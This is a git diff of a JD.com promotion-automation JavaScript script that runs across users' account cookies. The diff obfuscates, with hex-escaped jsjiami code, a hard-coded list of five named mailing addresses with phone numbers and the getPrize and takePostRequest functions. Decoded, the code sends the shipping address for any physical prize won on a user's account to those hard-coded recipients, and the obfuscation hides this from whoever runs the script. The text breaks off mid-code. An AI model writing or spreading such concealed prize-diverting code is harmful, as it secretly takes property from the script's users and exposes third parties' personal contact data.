@@ -32,14 +32,10 @@ $.joinErrorTimes = 0
 let cookiesArr = [], cookie = '', message;
 let lz_jdpin_token_cookie = ''
 let activityCookie = ''
-$.addressArray = [
-    "山东省,青岛市,市南区,香港西路69号光大国际金融中心,19963236955,266071,370202, 田豆",
-    "山东省,青岛市,李沧区,振华路149号1-3-301,19963236955,266041,370213, 田豆豆",
-    "山东省,青岛市,崂山区,泉岭路8号中商国际大厦,15265297926,266100,370212, 巩大豆",
-    "山东省,枣庄市,滕州市,解放路杏坛东区6-3-505,13396323685,277500,370481, 田甜豆",
-    "山东省,枣庄市,滕州市,鑫旺路嘉德城市花园,15163242552，277500,370481, 张豆"
-]
 
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe7d58=["\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5E02\u5357\u533A\x2C\u9999\u6E2F\u897F\u8DEF\x36\x37\u53F7\u5149\u5927\u56FD\u9645\u91D1\u878D\u4E2D\u5FC3\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x37\x31\x2C\x33\x37\x30\x32\x30\x32\x2C\x20\u7530\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x31\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x34\x31\x2C\x33\x37\x30\x32\x31\x33\x2C\x20\u7530\u8C46\u8C46","\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5D02\u5C71\u533A\x2C\u6CC9\u5CAD\u8DEF\x38\u53F7\u4E2D\u5546\u56FD\u9645\u5927\u53A6\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x32\x2C\x20\u5DE9\u5927\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u89E3\u653E\u8DEF\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u7530\u751C\u8C46","\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u946B\u65FA\u8DEF\u5609\u5FB7\u57CE\u5E02\u82B1\u56ED\x2C\x31\x35\x31\x36\x33\x32\x34\x32\x35\x35\x32\uFF0C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\x20\u5F20\u8C46","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];$[__Oxe7d58[0x0]]= [__Oxe7d58[0x1],__Oxe7d58[0x2],__Oxe7d58[0x3],__Oxe7d58[0x4],__Oxe7d58[0x5]];(function(_0xc251x1,_0xc251x2,_0xc251x3,_0xc251x4,_0xc251x5,_0xc251x6){_0xc251x6= __Oxe7d58[0x6];_0xc251x4= function(_0xc251x7){if( typeof alert!== _0xc251x6){alert(_0xc251x7)};if( typeof console!== _0xc251x6){console[__Oxe7d58[0x7]](_0xc251x7)}};_0xc251x3= function(_0xc251x8,_0xc251x1){return _0xc251x8+ _0xc251x1};_0xc251x5= _0xc251x3(__Oxe7d58[0x8],_0xc251x3(_0xc251x3(__Oxe7d58[0x9],__Oxe7d58[0xa]),__Oxe7d58[0xb]));try{_0xc251x1= __encode;if(!( typeof _0xc251x1!== _0xc251x6&& _0xc251x1=== _0xc251x3(__Oxe7d58[0xc],__Oxe7d58[0xd]))){_0xc251x4(_0xc251x5)}}catch(e){_0xc251x4(_0xc251x5)}})({})
+
+const redis = require('redis');
 $.redisStatus = process.env.USE_REDIS ? process.env.USE_REDIS : false;
 $.signUrl = process.env.JD_SIGN_URL ? process.env.JD_SIGN_URL : '';
 if ($.signUrl == '') {
@@ -318,43 +314,7 @@ async function jdmodule2() {
 }
 
 //运行
-async function getPrize() {
-    try {
-        console.log("---查看中奖结果---")
-        await takePostRequest("drawResult");
-        if ($.prizeInfo != '') {
-            needWriteAddress = $.prizeInfo.needWriteAddress || 'n'
-            if (needWriteAddress == 'y') {
-                drawInfo = $.prizeInfo.drawInfo
-                $.shiwuName = drawInfo.name
-                $.generateId = $.prizeInfo.addressId || ''
-                if ($.shiwuName.indexOf('京豆') == -1 && $.shiwuName.indexOf('积分') == -1 && $.shiwuName.indexOf('优惠券') == -1) {
-                    $.fullAddress = $.addressArray[cookiesArr.length % $.addressArray.length]
-                    console.log("邮寄地址：" + $.fullAddress)
-                    let fullAddressArray = $.fullAddress.split(",")
-                    $.province = fullAddressArray[0]
-                    $.city = fullAddressArray[1]
-                    $.county = fullAddressArray[2]
-                    $.address = fullAddressArray[3]
-                    $.phone = fullAddressArray[4]
-                    $.postalCode = fullAddressArray[5]
-                    $.areaCode = fullAddressArray[6]
-                    $.postalName = fullAddressArray[7]
-                    if ($.generateId == '') {
-                        await takePostRequest(`saveAddress`)
-                    } else {
-                        await takePostRequest(`saveAddressWithGenerateId`)
-                    }
-
-                }
-            }
-        }
-        // }
-        // }
-    } catch (e) {
-        console.log(e);
-    }
-}
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe7d59=["\x2D\x2D\x2D\u67E5\u770B\u4E2D\u5956\u7ED3\u679C\x2D\x2D\x2D","\x6C\x6F\x67","\x64\x72\x61\x77\x52\x65\x73\x75\x6C\x74","\x70\x72\x69\x7A\x65\x49\x6E\x66\x6F","","\x6E\x65\x65\x64\x57\x72\x69\x74\x65\x41\x64\x64\x72\x65\x73\x73","\x6E","\x79","\x64\x72\x61\x77\x49\x6E\x66\x6F","\x73\x68\x69\x77\x75\x4E\x61\x6D\x65","\x6E\x61\x6D\x65","\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x61\x64\x64\x72\x65\x73\x73\x49\x64","\u4EAC\u8C46","\x69\x6E\x64\x65\x78\x4F\x66","\u79EF\u5206","\u4F18\u60E0\u5238","\x66\x75\x6C\x6C\x41\x64\x64\x72\x65\x73\x73","\x6C\x65\x6E\x67\x74\x68","\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79","\u90AE\u5BC4\u5730\u5740\uFF1A","\x2C","\x73\x70\x6C\x69\x74","\x70\x72\x6F\x76\x69\x6E\x63\x65","\x63\x69\x74\x79","\x63\x6F\x75\x6E\x74\x79","\x61\x64\x64\x72\x65\x73\x73","\x70\x68\x6F\x6E\x65","\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65","\x61\x72\x65\x61\x43\x6F\x64\x65","\x70\x6F\x73\x74\x61\x6C\x4E\x61\x6D\x65","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];async function getPrize(){try{console[__Oxe7d59[0x1]](__Oxe7d59[0x0]); await takePostRequest(__Oxe7d59[0x2]);if($[__Oxe7d59[0x3]]!= __Oxe7d59[0x4]){needWriteAddress= $[__Oxe7d59[0x3]][__Oxe7d59[0x5]]|| __Oxe7d59[0x6];if(needWriteAddress== __Oxe7d59[0x7]){drawInfo= $[__Oxe7d59[0x3]][__Oxe7d59[0x8]];$[__Oxe7d59[0x9]]= drawInfo[__Oxe7d59[0xa]];$[__Oxe7d59[0xb]]= $[__Oxe7d59[0x3]][__Oxe7d59[0xc]]|| __Oxe7d59[0x4];if($[__Oxe7d59[0x9]][__Oxe7d59[0xe]](__Oxe7d59[0xd])==  -1&& $[__Oxe7d59[0x9]][__Oxe7d59[0xe]](__Oxe7d59[0xf])==  -1&& $[__Oxe7d59[0x9]][__Oxe7d59[0xe]](__Oxe7d59[0x10])==  -1){$[__Oxe7d59[0x11]]= $[__Oxe7d59[0x13]][cookiesArr[__Oxe7d59[0x12]]% $[__Oxe7d59[0x13]][__Oxe7d59[0x12]]];console[__Oxe7d59[0x1]](__Oxe7d59[0x14]+ $[__Oxe7d59[0x11]]);let _0x57b3x2=$[__Oxe7d59[0x11]][__Oxe7d59[0x16]](__Oxe7d59[0x15]);$[__Oxe7d59[0x17]]= _0x57b3x2[0x0];$[__Oxe7d59[0x18]]= _0x57b3x2[0x1];$[__Oxe7d59[0x19]]= _0x57b3x2[0x2];$[__Oxe7d59[0x1a]]= _0x57b3x2[0x3];$[__Oxe7d59[0x1b]]= _0x57b3x2[0x4];$[__Oxe7d59[0x1c]]= _0x57b3x2[0x5];$[__Oxe7d59[0x1d]]= _0x57b3x2[0x6];$[__Oxe7d59[0x1e]]= _0x57b3x2[0x7];if($[__Oxe7d59[0xb]]== __Oxe7d59[0x4]){ await takePostRequest(`${__Oxe7d59[0x1f]}`)}else { await takePostRequest(`${__Oxe7d59[0x20]}`)}}}}}catch(e){console[__Oxe7d59[0x1]](e)}}(function(_0x57b3x3,_0x57b3x4,_0x57b3x5,_0x57b3x6,_0x57b3x7,_0x57b3x8){_0x57b3x8= __Oxe7d59[0x21];_0x57b3x6= function(_0x57b3x9){if( typeof alert!== _0x57b3x8){alert(_0x57b3x9)};if( typeof console!== _0x57b3x8){console[__Oxe7d59[0x1]](_0x57b3x9)}};_0x57b3x5= function(_0x57b3xa,_0x57b3x3){return _0x57b3xa+ _0x57b3x3};_0x57b3x7= _0x57b3x5(__Oxe7d59[0x22],_0x57b3x5(_0x57b3x5(__Oxe7d59[0x23],__Oxe7d59[0x24]),__Oxe7d59[0x25]));try{_0x57b3x3= __encode;if(!( typeof _0x57b3x3!== _0x57b3x8&& _0x57b3x3=== _0x57b3x5(__Oxe7d59[0x26],__Oxe7d59[0x27]))){_0x57b3x6(_0x57b3x7)}}catch(e){_0x57b3x6(_0x57b3x7)}})({})
 
 function getSign(domain) {
     let myRequest = getSignRequest(domain);
@@ -399,139 +359,7 @@ function getSignRequest(domain, method = "POST") {
     return { url: url, method: method, headers: headers, body: body, timeout: 30000 };
 }
 
-async function takePostRequest(type) {
-    if ($.outFlag) return
-    let domain = $.domain;
-    let body = ``;
-    let method = 'POST'
-    let admJson = ''
-    switch (type) {
-        case 'isvObfuscator':
-            url = `https://api.m.jd.com/client.action?functionId=isvObfuscator`;
-            body = $.sign
-            // console.log("body:" + body)
-            break;
-        case 'getSimpleActInfoVo':
-            url = `https://${$.domain}/customer/getSimpleActInfoVo`;
-            body = `activityId=${$.activityId}`;
-            break;
-        case 'getMyPing':
-            url = `https://${$.domain}/customer/getMyPing`;
-            body = `userId=${$.venderId}&token=${$.Token}&fromType=APP`;
-            break;
-        case 'accessLogWithAD':
-            url = `https://${$.domain}/common/accessLogWithAD`;
-            let pageurl = `https://${$.domain}/drawCenter/activity?activityId=${$.activityId}&friendUuid=${$.friendUuid}`
-            body = `venderId=${$.venderId}&code=2004&pin=${encodeURIComponent($.Pin)}&activityId=${$.activityId}&pageUrl=${encodeURIComponent(pageurl)}&subType=app&adSource=`
-            break;
-        case 'getUserInfo':
-            url = `https://${$.domain}/wxActionCommon/getUserInfo`;
-            body = `pin=${encodeURIComponent($.Pin)}`;
-            break;
-        case 'activityContent':
-            url = `https://${$.domain}/wxCartKoi//cartkoi/activityContent`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}&pinImg=${encodeURIComponent($.attrTouXiang)}&status=1&friendUuid=${$.friendUuid}`
-            break;
-        case 'getProduct':
-            url = `https://${$.domain}/drawCenter/getProduct`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}&type=${$.task.type}`
-            break;
-        case 'getActMemberInfo':
-            url = `https://${$.domain}/wxCommonInfo/getActMemberInfo`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}&venderId=${$.venderId}`
-            break;
-        case 'info':
-            url = `https://${$.domain}/drawCenter/myInfo`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}`
-            break;
-        case 'startDraw':
-            url = `${domain}/joint/order/draw`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}&actorUuid=${$.actorUuid}&drawType=1`
-            break;
-        case 'followShop':
-            url = `https://${$.domain}/wxActionCommon/followShop`;
-            // url = `${domain}/dingzhi/dz/openCard/saveTask`;
-            body = `activityId=${$.activityId}&buyerNick=${encodeURIComponent($.Pin)}&userId=${$.venderId}&activityType=${$.activityType}`
-            break;
-        case 'sign':
-        case 'quickAddSku':
-            url = `https://${$.domain}/wxCartKoi/cartkoi/quickAddCart`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}&productIds=${encodeURIComponent(JSON.stringify($.productIds))}`
-            break;
-        case 'browseGoods':
-            url = `${domain}/dingzhi/opencard/${type}`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}`
-            if (type == 'browseGoods') body += `&value=${$.visitSkuValue}`
-            break;
-        case '邀请':
-        case '助力':
-            if (type == '助力') {
-                url = `${domain}/dingzhi/linkgame/assist`;
-            } else {
-                url = `${domain}/dingzhi/linkgame/assist/status`;
-            }
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}&shareUuid=${$.shareUuid}`
-            break;
-        case 'drawResult':
-            url = `https://${domain}/wxCartKoi/cartkoi/drawResult`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}&uuid=${$.uuid}`
-            break;
-        case 'addSku':
-            url = `https://${$.domain}/drawCenter/doTask`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}&taskId=${$.task.taskId}&param=${$.pro.skuId}`
-            break;
-        case 'getDrawRecordHasCoupon':
-            url = `${domain}/dingzhi/linkgame/draw/record`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}&actorUuid=${$.actorUuid}`
-            break;
-        case 'getShareRecord':
-            url = `${domain}/dingzhi/linkgame/help/list`;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}`
-            break;
-        case '抽奖':
-            url = `https://${$.domain}/drawCenter/draw/luckyDraw`;;
-            body = `activityId=${$.activityId}&pin=${encodeURIComponent($.Pin)}`
-            break;
-        case 'saveAddress':
-            url = `https://${$.domain}/wxAddress/save`
-            body = `venderId=${$.venderId}&pin=${encodeURIComponent($.Pin)}&actType=${$.activityType}&activityId=${$.activityId}&prizeName=${encodeURIComponent($.shiwuName)}&receiver=${encodeURIComponent($.postalName)}&phone=${$.phone}&province=${encodeURIComponent($.province)}&city=${encodeURIComponent($.city)}&address=${encodeURIComponent($.address)}&generateId=&postalCode=${$.postalCode}&personalEmail=&areaCode=${$.areaCode}&county=${encodeURIComponent($.county)}`
-            break;
-        case 'saveAddressWithGenerateId':
-            url = `https://${$.domain}/wxAddress/save`
-            body = `venderId=${$.venderId}&pin=${encodeURIComponent($.Pin)}&actType=${$.activityType}&activityId=${$.activityId}&prizeName=${encodeURIComponent($.shiwuName)}&receiver=${encodeURIComponent($.postalName)}&phone=${$.phone}&province=${encodeURIComponent($.province)}&city=${encodeURIComponent($.city)}&address=${encodeURIComponent($.address)}&generateId=${$.generateId}&postalCode=${$.postalCode}&personalEmail=&areaCode=${$.areaCode}&county=${encodeURIComponent($.county)}`
-            break;
-        default:
-            console.log(`错误${type}`);
-    }
-    // console.log("body-----:" + body)
-    let myRequest = getPostRequest(url, body, method);
-    // console.log(myRequest)
-    return new Promise(async resolve => {
-        $.post(myRequest, (err, resp, data) => {
-            try {
-                setActivityCookie(resp)
-                if (err) {
-                    if (resp && typeof resp.statusCode != 'undefined') {
-                        if (resp.statusCode == 493) {
-                            console.log('此ip已被限制，请过10分钟后再执行脚本\n')
-                            $.outFlag = true
-                        }
-                    }
-                    console.log(`${$.toStr(err, err)}`)
-                    console.log(`${type} API请求失败，请检查网路重试`)
-                } else {
-                    // console.log(data);
-                    dealReturn(type, data);
-                }
-            } catch (e) {
-                // console.log(data);
-                console.log(e, resp)
-            } finally {
-                resolve();
-            }
-        })
-    })
-}
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxe7d5a=["\x6F\x75\x74\x46\x6C\x61\x67","\x64\x6F\x6D\x61\x69\x6E","","\x50\x4F\x53\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x63\x6C\x69\x65\x6E\x74\x2E\x61\x63\x74\x69\x6F\x6E\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x69\x73\x76\x4F\x62\x66\x75\x73\x63\x61\x74\x6F\x72","\x73\x69\x67\x6E","\x69\x73\x76\x4F\x62\x66\x75\x73\x63\x61\x74\x6F\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x2F\x63\x75\x73\x74\x6F\x6D\x65\x72\x2F\x67\x65\x74\x53\x69\x6D\x70\x6C\x65\x41\x63\x74\x49\x6E\x66\x6F\x56\x6F","\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3D","\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64","\x67\x65\x74\x53\x69\x6D\x70\x6C\x65\x41\x63\x74\x49\x6E\x66\x6F\x56\x6F","\x2F\x63\x75\x73\x74\x6F\x6D\x65\x72\x2F\x67\x65\x74\x4D\x79\x50\x69\x6E\x67","\x75\x73\x65\x72\x49\x64\x3D","\x76\x65\x6E\x64\x65\x72\x49\x64","\x26\x74\x6F\x6B\x65\x6E\x3D","\x54\x6F\x6B\x65\x6E","\x26\x66\x72\x6F\x6D\x54\x79\x70\x65\x3D\x41\x50\x50","\x67\x65\x74\x4D\x79\x50\x69\x6E\x67","\x2F\x63\x6F\x6D\x6D\x6F\x6E\x2F\x61\x63\x63\x65\x73\x73\x4C\x6F\x67\x57\x69\x74\x68\x41\x44","\x2F\x64\x72\x61\x77\x43\x65\x6E\x74\x65\x72\x2F\x61\x63\x74\x69\x76\x69\x74\x79\x3F\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3D","\x26\x66\x72\x69\x65\x6E\x64\x55\x75\x69\x64\x3D","\x66\x72\x69\x65\x6E\x64\x55\x75\x69\x64","\x76\x65\x6E\x64\x65\x72\x49\x64\x3D","\x26\x63\x6F\x64\x65\x3D\x32\x30\x30\x34\x26\x70\x69\x6E\x3D","\x26\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3D","\x26\x70\x61\x67\x65\x55\x72\x6C\x3D","\x26\x73\x75\x62\x54\x79\x70\x65\x3D\x61\x70\x70\x26\x61\x64\x53\x6F\x75\x72\x63\x65\x3D","\x61\x63\x63\x65\x73\x73\x4C\x6F\x67\x57\x69\x74\x68\x41\x44","\x2F\x77\x78\x41\x63\x74\x69\x6F\x6E\x43\x6F\x6D\x6D\x6F\x6E\x2F\x67\x65\x74\x55\x73\x65\x72\x49\x6E\x66\x6F","\x70\x69\x6E\x3D","\x67\x65\x74\x55\x73\x65\x72\x49\x6E\x66\x6F","\x2F\x77\x78\x43\x61\x72\x74\x4B\x6F\x69\x2F\x2F\x63\x61\x72\x74\x6B\x6F\x69\x2F\x61\x63\x74\x69\x76\x69\x74\x79\x43\x6F\x6E\x74\x65\x6E\x74","\x26\x70\x69\x6E\x3D","\x26\x70\x69\x6E\x49\x6D\x67\x3D","\x61\x74\x74\x72\x54\x6F\x75\x58\x69\x61\x6E\x67","\x26\x73\x74\x61\x74\x75\x73\x3D\x31\x26\x66\x72\x69\x65\x6E\x64\x55\x75\x69\x64\x3D","\x61\x63\x74\x69\x76\x69\x74\x79\x43\x6F\x6E\x74\x65\x6E\x74","\x2F\x64\x72\x61\x77\x43\x65\x6E\x74\x65\x72\x2F\x67\x65\x74\x50\x72\x6F\x64\x75\x63\x74","\x26\x74\x79\x70\x65\x3D","\x74\x79\x70\x65","\x74\x61\x73\x6B","\x67\x65\x74\x50\x72\x6F\x64\x75\x63\x74","\x2F\x77\x78\x43\x6F\x6D\x6D\x6F\x6E\x49\x6E\x66\x6F\x2F\x67\x65\x74\x41\x63\x74\x4D\x65\x6D\x62\x65\x72\x49\x6E\x66\x6F","\x26\x76\x65\x6E\x64\x65\x72\x49\x64\x3D","\x67\x65\x74\x41\x63\x74\x4D\x65\x6D\x62\x65\x72\x49\x6E\x66\x6F","\x2F\x64\x72\x61\x77\x43\x65\x6E\x74\x65\x72\x2F\x6D\x79\x49\x6E\x66\x6F","\x69\x6E\x66\x6F","\x2F\x6A\x6F\x69\x6E\x74\x2F\x6F\x72\x64\x65\x72\x2F\x64\x72\x61\x77","\x26\x61\x63\x74\x6F\x72\x55\x75\x69\x64\x3D","\x61\x63\x74\x6F\x72\x55\x75\x69\x64","\x26\x64\x72\x61\x77\x54\x79\x70\x65\x3D\x31","\x73\x74\x61\x72\x74\x44\x72\x61\x77","\x2F\x77\x78\x41\x63\x74\x69\x6F\x6E\x43\x6F\x6D\x6D\x6F\x6E\x2F\x66\x6F\x6C\x6C\x6F\x77\x53\x68\x6F\x70","\x26\x62\x75\x79\x65\x72\x4E\x69\x63\x6B\x3D","\x26\x75\x73\x65\x72\x49\x64\x3D","\x26\x61\x63\x74\x69\x76\x69\x74\x79\x54\x79\x70\x65\x3D","\x61\x63\x74\x69\x76\x69\x74\x79\x54\x79\x70\x65","\x66\x6F\x6C\x6C\x6F\x77\x53\x68\x6F\x70","\x2F\x77\x78\x43\x61\x72\x74\x4B\x6F\x69\x2F\x63\x61\x72\x74\x6B\x6F\x69\x2F\x71\x75\x69\x63\x6B\x41\x64\x64\x43\x61\x72\x74","\x26\x70\x72\x6F\x64\x75\x63\x74\x49\x64\x73\x3D","\x70\x72\x6F\x64\x75\x63\x74\x49\x64\x73","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x71\x75\x69\x63\x6B\x41\x64\x64\x53\x6B\x75","\x2F\x64\x69\x6E\x67\x7A\x68\x69\x2F\x6F\x70\x65\x6E\x63\x61\x72\x64\x2F","\x62\x72\x6F\x77\x73\x65\x47\x6F\x6F\x64\x73","\x26\x76\x61\x6C\x75\x65\x3D","\x76\x69\x73\x69\x74\x53\x6B\x75\x56\x61\x6C\x75\x65","\u9080\u8BF7","\u52A9\u529B","\x2F\x64\x69\x6E\x67\x7A\x68\x69\x2F\x6C\x69\x6E\x6B\x67\x61\x6D\x65\x2F\x61\x73\x73\x69\x73\x74","\x2F\x64\x69\x6E\x67\x7A\x68\x69\x2F\x6C\x69\x6E\x6B\x67\x61\x6D\x65\x2F\x61\x73\x73\x69\x73\x74\x2F\x73\x74\x61\x74\x75\x73","\x26\x73\x68\x61\x72\x65\x55\x75\x69\x64\x3D","\x73\x68\x61\x72\x65\x55\x75\x69\x64","\x2F\x77\x78\x43\x61\x72\x74\x4B\x6F\x69\x2F\x63\x61\x72\x74\x6B\x6F\x69\x2F\x64\x72\x61\x77\x52\x65\x73\x75\x6C\x74","\x26\x75\x75\x69\x64\x3D","\x75\x75\x69\x64","\x64\x72\x61\x77\x52\x65\x73\x75\x6C\x74","\x2F\x64\x72\x61\x77\x43\x65\x6E\x74\x65\x72\x2F\x64\x6F\x54\x61\x73\x6B","\x26\x74\x61\x73\x6B\x49\x64\x3D","\x74\x61\x73\x6B\x49\x64","\x26\x70\x61\x72\x61\x6D\x3D","\x73\x6B\x75\x49\x64","\x70\x72\x6F","\x61\x64\x64\x53\x6B\x75","\x2F\x64\x69\x6E\x67\x7A\x68\x69\x2F\x6C\x69\x6E\x6B\x67\x61\x6D\x65\x2F\x64\x72\x61\x77\x2F\x72\x65\x63\x6F\x72\x64","\x67\x65\x74\x44\x72\x61\x77\x52\x65\x63\x6F\x72\x64\x48\x61\x73\x43\x6F\x75\x70\x6F\x6E","\x2F\x64\x69\x6E\x67\x7A\x68\x69\x2F\x6C\x69\x6E\x6B\x67\x61\x6D\x65\x2F\x68\x65\x6C\x70\x2F\x6C\x69\x73\x74","\x67\x65\x74\x53\x68\x61\x72\x65\x52\x65\x63\x6F\x72\x64","\x2F\x64\x72\x61\x77\x43\x65\x6E\x74\x65\x72\x2F\x64\x72\x61\x77\x2F\x6C\x75\x63\x6B\x79\x44\x72\x61\x77","\u62BD\u5956","\x2F\x77\x78\x41\x64\x64\x72\x65\x73\x73\x2F\x73\x61\x76\x65","\x26\x61\x63\x74\x54\x79\x70\x65\x3D","\x26\x70\x72\x69\x7A\x65\x4E\x61\x6D\x65\x3D","\x73\x68\x69\x77\x75\x4E\x61\x6D\x65","\x26\x72\x65\x63\x65\x69\x76\x65\x72\x3D","\x70\x6F\x73\x74\x61\x6C\x4E\x61\x6D\x65","\x26\x70\x68\x6F\x6E\x65\x3D","\x70\x68\x6F\x6E\x65","\x26\x70\x72\x6F\x76\x69\x6E\x63\x65\x3D","\x70\x72\x6F\x76\x69\x6E\x63\x65","\x26\x63\x69\x74\x79\x3D","\x63\x69\x74\x79","\x26\x61\x64\x64\x72\x65\x73\x73\x3D","\x61\x64\x64\x72\x65\x73\x73","\x26\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64\x3D\x26\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65\x3D","\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65","\x26\x70\x65\x72\x73\x6F\x6E\x61\x6C\x45\x6D\x61\x69\x6C\x3D\x26\x61\x72\x65\x61\x43\x6F\x64\x65\x3D","\x61\x72\x65\x61\x43\x6F\x64\x65","\x26\x63\x6F\x75\x6E\x74\x79\x3D","\x63\x6F\x75\x6E\x74\x79","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73","\x26\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64\x3D","\x67\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\x26\x70\x6F\x73\x74\x61\x6C\x43\x6F\x64\x65\x3D","\x73\x61\x76\x65\x41\x64\x64\x72\x65\x73\x73\x57\x69\x74\x68\x47\x65\x6E\x65\x72\x61\x74\x65\x49\x64","\u9519\u8BEF","\x6C\x6F\x67","\x73\x74\x61\x74\x75\x73\x43\x6F\x64\x65","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u6B64\x69\x70\u5DF2\u88AB\u9650\u5236\uFF0C\u8BF7\u8FC7\x31\x30\u5206\u949F\u540E\u518D\u6267\u884C\u811A\u672C\x0A","\x74\x6F\x53\x74\x72","\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5","\x70\x6F\x73\x74","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];async function takePostRequest(_0xcd07x2){if($[__Oxe7d5a[0x0]]){return};let _0xcd07x3=$[__Oxe7d5a[0x1]];let _0xcd07x4=`${__Oxe7d5a[0x2]}`;let _0xcd07x5=__Oxe7d5a[0x3];let _0xcd07x6=__Oxe7d5a[0x2];switch(_0xcd07x2){case __Oxe7d5a[0x6]:url= `${__Oxe7d5a[0x4]}`;_0xcd07x4= $[__Oxe7d5a[0x5]];break;case __Oxe7d5a[0xb]:url= 